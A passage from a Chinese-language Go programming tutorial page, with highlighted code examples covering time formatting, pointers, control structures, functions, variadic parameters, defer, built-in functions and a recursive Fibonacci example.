中的 &#96;\n\&#96; 会被原样输出。</span><br></pre></td></tr></table></figure></li></ul><h3 id="时间和日期"><a href="#时间和日期" class="headerlink" title="时间和日期"></a>时间和日期</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> week time.Duration</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    t := time.Now()</span><br><span class="line">    fmt.Println(t) <span class="comment">// e.g. Wed Dec 21 09:52:14 +0100 RST 2011</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%02d.%02d.%4d\n&quot;</span>, t.Day(), t.Month(), t.Year())</span><br><span class="line">    <span class="comment">// 21.12.2011</span></span><br><span class="line">    t = time.Now().UTC()</span><br><span class="line">    fmt.Println(t) <span class="comment">// Wed Dec 21 08:52:14 +0000 UTC 2011</span></span><br><span class="line">    fmt.Println(time.Now()) <span class="comment">// Wed Dec 21 09:52:14 +0100 RST 2011</span></span><br><span class="line">    <span class="comment">// calculating times:</span></span><br><span class="line">    week = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span> * <span class="number">1e9</span> <span class="comment">// must be in nanosec</span></span><br><span class="line">    week_from_now := t.Add(week)</span><br><span class="line">    fmt.Println(week_from_now) <span class="comment">// Wed Dec 28 08:52:14 +0000 UTC 2011</span></span><br><span class="line">    <span class="comment">// formatting times:</span></span><br><span class="line">    fmt.Println(t.Format(time.RFC822)) <span class="comment">// 21 Dec 11 0852 UTC</span></span><br><span class="line">    fmt.Println(t.Format(time.ANSIC)) <span class="comment">// Wed Dec 21 08:56:34 2011</span></span><br><span class="line">    fmt.Println(t.Format(<span class="string">&quot;02 Jan 2006 15:04&quot;</span>)) <span class="comment">// 21 Dec 2011 08:52</span></span><br><span class="line">    s := t.Format(<span class="string">&quot;20060102&quot;</span>)</span><br><span class="line">    fmt.Println(t, <span class="string">&quot;=&gt;&quot;</span>, s)</span><br><span class="line">    <span class="comment">// Wed Dec 21 08:52:14 +0000 UTC 2011 =&gt; 20111221</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>程序在内存中存储它的值，每个内存块（或字）有一个<strong>地址</strong>，通常用<strong>十六进制数</strong>表示，如：<code>0x6b0820</code> 或<code>0xf84001d7f0</code>。</p><p><strong>一个指针变量可以指向任何一个值的内存地址</strong> 它指向那个值的内存地址，在 32 位机器上占用 4 个字节，在 64 位机器上占用 8 个字节，并且与它所指向的值的大小无关。</p><p>Go 语言的取地址符是 <code>&amp;</code>，放到一个变量前使用就会返回相应<strong>变量的内存地址</strong>。</p><p>指针类型前面加上<code>*</code>号（前缀）来<strong>获取指针所指向的内容</strong>，这里的 * 号是一个类型更改器。使用一个指针引用一个值被称为间接引用。</p><p>当一个指针被定义后<strong>没有分配到任何变量</strong>时，它的值为 <code>nil</code>。</p><p>一个指针变量通常缩写为 <code>ptr</code>。</p><p>例：展示了分配一个新的值给 *p 并且更改这个变量自己的值（这里是一个字符串）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    s := <span class="string">&quot;good bye&quot;</span></span><br><span class="line">    <span class="keyword">var</span> p *<span class="keyword">string</span> = &amp;s</span><br><span class="line">    *p = <span class="string">&quot;ciao&quot;</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;Here is the pointer p: %p\n&quot;</span>, p) <span class="comment">// prints address</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;Here is the string *p: %s\n&quot;</span>, *p) <span class="comment">// prints string</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;Here is the string s: %s\n&quot;</span>, s) <span class="comment">// prints same string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">Here is the pointer p: <span class="number">0x2540820</span></span><br><span class="line">Here is the <span class="keyword">string</span> *p: ciao</span><br><span class="line">Here is the <span class="keyword">string</span> s: ciao</span><br></pre></td></tr></table></figure><h2 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h2><h3 id="if-else-结构"><a href="#if-else-结构" class="headerlink" title="if-else 结构"></a>if-else 结构</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> condition1 &#123;</span><br><span class="line">    <span class="comment">// do something </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> condition2 &#123;</span><br><span class="line">    <span class="comment">// do something else    </span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// catch-all or default</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">判断一个字符串是否为空</span><br><span class="line"><span class="keyword">if</span> str == <span class="string">&quot;&quot;</span> &#123; ... &#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(str) == <span class="number">0</span> &#123;...&#125;</span><br><span class="line"></span><br><span class="line">判断系统，分别提示</span><br><span class="line"><span class="keyword">var</span> prompt = <span class="string">&quot;Enter a digit, e.g. 3 &quot;</span>+ <span class="string">&quot;or %s to quit.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> runtime.GOOS == <span class="string">&quot;windows&quot;</span> &#123;</span><br><span class="line">        prompt = fmt.Sprintf(prompt, <span class="string">&quot;Ctrl+Z, Enter&quot;</span>)       </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//Unix-like</span></span><br><span class="line">        prompt = fmt.Sprintf(prompt, <span class="string">&quot;Ctrl+D&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="switch-结构"><a href="#switch-结构" class="headerlink" title="switch 结构"></a>switch 结构</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> condition1:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> condition2:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="for结构"><a href="#for结构" class="headerlink" title="for结构"></a>for结构</h3><h4 id="基于计数器的迭代"><a href="#基于计数器的迭代" class="headerlink" title="基于计数器的迭代"></a>基于计数器的迭代</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;This is the %d iteration\n&quot;</span>, i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="for-range-结构"><a href="#for-range-结构" class="headerlink" title="for-range 结构"></a>for-range 结构</h4><p>它可以迭代任何一个集合（包括数组和 map)，一般形式为：<code>for ix, val := range coll &#123; &#125;</code>。</p><p><code>val</code> 始终为集合中对应索引的值拷贝，因此它一般只具有只读性质，对它所做的任何修改都不会影响到集合中原有的值（<strong>译者注：如果 <code>val</code> 为指针，则会产生指针的拷贝，依旧可以修改集合中的原值</strong>）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> pos, char := <span class="keyword">range</span> str &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Break-与-continue"><a href="#Break-与-continue" class="headerlink" title="Break 与 continue"></a>Break 与 continue</h3><p><code>break</code> 的作用范围为该语句出现后的最内部的结构，它可以被用于任何形式的 for 循环（计数器、条件判断等）。但在 switch 或 select 语句中，break 语句的作用结果是跳过整个代码块，执行后续的代码。</p><p><code>continue</code> 忽略剩余的循环体而直接进入下一次循环的过程，但不是无条件执行下一次循环，执行之前依旧需要满足循环的判断条件。</p><h3 id="标签与-goto"><a href="#标签与-goto" class="headerlink" title="标签与 goto"></a>标签与 goto</h3><p><code>for</code>、<code>switch</code> 或 <code>select</code> 语句都可以配合标签（label）形式的标识符使用，即某一行第一个以冒号（<code>:</code>）结尾的单词（gofmt 会将后续代码自动移至下一行）。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LABEL1:</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">0</span>; j &lt;= <span class="number">5</span>; j++ &#123;</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">4</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span> LABEL1</span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;i is: %d, and j is: %d\n&quot;</span>, i, j)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="函数（function）"><a href="#函数（function）" class="headerlink" title="函数（function）"></a>函数（function）</h2><h3 id="函数参数与返回值"><a href="#函数参数与返回值" class="headerlink" title="函数参数与返回值"></a>函数参数与返回值</h3><h4 id="按值-引用传递"><a href="#按值-引用传递" class="headerlink" title="按值\引用传递"></a>按值\引用传递</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Multiply 2 * 5 * 6 = %d\n&quot;</span>, MultiPly3Nums(<span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>))</span><br><span class="line">    <span class="comment">// var i1 int = MultiPly3Nums(2, 5, 6)</span></span><br><span class="line">    <span class="comment">// fmt.Printf(&quot;MultiPly 2 * 5 * 6 = %d\n&quot;, i1)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MultiPly3Nums</span><span class="params">(a <span class="keyword">int</span>, b <span class="keyword">int</span>, c <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// var product int = a * b * c</span></span><br><span class="line">    <span class="comment">// return product</span></span><br><span class="line">    <span class="keyword">return</span> a * b * c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出显示：</span><br><span class="line"></span><br><span class="line">Multiply <span class="number">2</span> * <span class="number">5</span> * <span class="number">6</span> = <span class="number">60</span></span><br></pre></td></tr></table></figure><h4 id="命名的返回值"><a href="#命名的返回值" class="headerlink" title="命名的返回值"></a>命名的返回值</h4><p><code>getX2AndX3</code> 与 <code>getX2AndX3_2</code> 两个函数演示了如何使用非命名返回值与命名返回值的特性。当需要返回多个非命名返回值时，需要使用 <code>()</code> 把它们括起来，比如 <code>(int, int)</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num <span class="keyword">int</span> = <span class="number">10</span></span><br><span class="line"><span class="keyword">var</span> numx2, numx3 <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    numx2, numx3 = getX2AndX3(num)</span><br><span class="line">    PrintValues() <span class="comment">//输出：num = 10, 2x num = 20, 3x num = 30 </span></span><br><span class="line">    numx2, numx3 = getX2AndX3_2(num)</span><br><span class="line">    PrintValues() <span class="comment">//输出：num = 10, 2x num = 20, 3x num = 30  </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PrintValues</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;num = %d, 2x num = %d, 3x num = %d\n&quot;</span>, num, numx2, numx3)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getX2AndX3</span><span class="params">(input <span class="keyword">int</span>)</span> <span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * input, <span class="number">3</span> * input</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getX2AndX3_2</span><span class="params">(input <span class="keyword">int</span>)</span> <span class="params">(x2 <span class="keyword">int</span>, x3 <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    x2 = <span class="number">2</span> * input</span><br><span class="line">    x3 = <span class="number">3</span> * input</span><br><span class="line">    <span class="comment">// return x2, x3</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="空白符"><a href="#空白符" class="headerlink" title="空白符"></a>空白符</h4><p>空白符用来匹配一些不需要的值，然后丢弃掉。<code>ThreeValues</code> 是拥有三个返回值的不需要任何参数的函数，在下面的例子中，我们将第一个与第三个返回值赋给了 <code>i1</code> 与<code>f1</code>。第二个返回值赋给了空白符 <code>_</code>，然后自动丢弃掉。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> i1 <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">var</span> f1 <span class="keyword">float32</span></span><br><span class="line">    i1, _, f1 = ThreeValues()</span><br><span class="line">    fmt.Printf(<span class="string">&quot;The int: %d, the float: %f \n&quot;</span>, i1, f1) <span class="comment">//输出：The int: 5, the float: 7.500000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ThreeValues</span><span class="params">()</span> <span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">float32</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5</span>, <span class="number">6</span>, <span class="number">7.5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="改变外部变量"><a href="#改变外部变量" class="headerlink" title="改变外部变量"></a>改变外部变量</h4><p>传递指针给函数不但可以节省内存（因为没有复制变量的值），而且赋予了函数直接修改外部变量的能力，所以被修改的变量不再需要使用 <code>return</code> 返回。如下的例子，<code>reply</code> 是一个指向 <code>int</code> 变量的指针，通过这个指针，我们在函数内修改了这个 <code>int</code> 变量的数值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// this function changes reply:</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Multiply</span><span class="params">(a, b <span class="keyword">int</span>, reply *<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    *reply = a * b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    n := <span class="number">0</span></span><br><span class="line">    reply := &amp;n</span><br><span class="line">    Multiply(<span class="number">10</span>, <span class="number">5</span>, reply)</span><br><span class="line">    fmt.Println(<span class="string">&quot;Multiply:&quot;</span>, *reply) <span class="comment">// Multiply: 50</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="传递变长参数"><a href="#传递变长参数" class="headerlink" title="传递变长参数"></a>传递变长参数</h3><p>如果函数的最后一个参数是采用 <code>...type</code> 的形式，那么这个函数就可以处理一个变长的参数，这个长度可以为 0，这样的函数称为变参函数。</p><p>示例函数和调用：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Greeting</span><span class="params">(prefix <span class="keyword">string</span>, who ...<span class="keyword">string</span>)</span></span></span><br><span class="line">Greeting(<span class="string">&quot;hello:&quot;</span>, <span class="string">&quot;Joe&quot;</span>, <span class="string">&quot;Anna&quot;</span>, <span class="string">&quot;Eileen&quot;</span>)</span><br></pre></td></tr></table></figure><p>在 Greeting 函数中，变量 <code>who</code> 的值为 <code>[]string&#123;&quot;Joe&quot;, &quot;Anna&quot;, &quot;Eileen&quot;&#125;</code>。</p><p>如果参数被存储在一个数组 <code>arr</code> 中，则可以通过 <code>arr...</code> 的形式来传递参数调用变参函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := Min(<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;The minimum is: %d\n&quot;</span>, x) <span class="comment">// 输出：The minimum is: 0</span></span><br><span class="line">    arr := []<span class="keyword">int</span>&#123;<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>&#125;</span><br><span class="line">    x = Min(arr...)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;The minimum in the array arr is: %d&quot;</span>, x) <span class="comment">// 输出：The minimum in the array arr is: 1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Min</span><span class="params">(a ...<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    min := a[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> a &#123;</span><br><span class="line">        <span class="keyword">if</span> v &lt; min &#123;</span><br><span class="line">            min = v</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="defer-和追踪"><a href="#defer-和追踪" class="headerlink" title="defer 和追踪"></a>defer 和追踪</h3><p><a href="https://www.kancloud.cn/kancloud/the-way-to-go/72476">https://www.kancloud.cn/kancloud/the-way-to-go/72476</a></p><p>关键字 defer 允许我们推迟到函数返回之前（或任意位置执行 <code>return</code> 语句之后）一刻才执行某个语句或函数（为什么要在返回之后才执行这些语句？因为 <code>return</code> 语句同样可以包含一些操作，而不是单纯地返回某个值）。</p><p>关键字 defer 的用法类似于面向对象编程语言 Java 和 C# 的 <code>finally</code> 语句块，它一般用于释放某些已分配的资源。</p><p>当有多个 defer 行为被注册时，它们会以逆序执行（类似栈，即后进先出）</p><p>可以使用 defer 语句实现代码追踪</p><h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3><table><thead><tr><th align="left">名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">close</td><td align="left">用于管道通信</td></tr><tr><td align="left">len、cap</td><td align="left">len 用于返回某个类型的长度或数量（字符串、数组、切片、map 和管道）；cap 是容量的意思，用于返回某个类型的最大容量（只能用于切片和 map）</td></tr><tr><td align="left">new、make</td><td align="left">new 和 make 均是用于分配内存：new 用于值类型和用户定义的类型，如自定义结构，make 用户内置引用类型（切片、map 和管道）。它们的用法就像是函数，但是将类型作为参数：new(type)、make(type)。new(T) 分配类型 T 的零值并返回其地址，也就是指向类型 T 的指针（详见第 10.1 节）。它也可以被用于基本类型：<code>v := new(int)</code>。make(T) 返回类型 T 的初始化之后的值，因此它比 new 进行更多的工作（详见第 7.2.3/4 节、第 8.1.1 节和第 14.2.1 节）<strong>new() 是一个函数，不要忘记它的括号</strong></td></tr><tr><td align="left">copy、append</td><td align="left">用于复制和连接切片</td></tr><tr><td align="left">panic、recover</td><td align="left">两者均用于错误处理机制</td></tr><tr><td align="left">print、println</td><td align="left">底层打印函数（详见第 4.2 节），在部署环境中建议使用 fmt 包</td></tr><tr><td align="left">complex、real imag</td><td align="left">用于创建和操作复数（详见第 4.5.2.2 节</td></tr></tbody></table><h3 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h3><p>当一个函数在其函数体内调用自身，则称之为递归。最经典的例子便是计算斐波那契数列，即每个数均为前两个数之和。数列如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">377</span>, <span class="number">610</span>, <span class="number">987</span>, <span class="number">1597</span>, <span class="number">2584</span>, <span class="number">4181</span>, <span class="number">6765</span>, <span class="number">10946</span>, …</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    result := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= <span class="number">10</span>; i++ &#123;</span><br><span class="line">        result = fibonacci(i)</span><br><span class="line">        fmt.Printf(<span class="string">&quot;fibonacci(%d) is: %d\n&quot;</span>, i, result)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fibonacci</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="params">(res <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span> &#123;</span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res = fibonacci(n<span class="number">-1</span>) + fibonacci(n<span class="number">-2</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">fibonacci(<span class="number">0</span>) is: <span class="number">1</span></span><br><span class="line">fibonacci(<span class="number">1</span>) is: <span class="number">1</span></span><br><span class="line">fibonacci(<span class="number">2</span>) is: <span class="number">2</span></span><br><span class="line">fibonacci(<span class="number">3</span>) is: <span class="number">3</span></span><br><span class="line">fibonacci(<span class="number">4</span>) is: <span class="number">5</span></span><br><span class="line">fibonacci(<span class="number">5</span>) is: <span class="number">8</span></span><br><span class="line">fibonacci(<span class="number">6</span>) is: <span 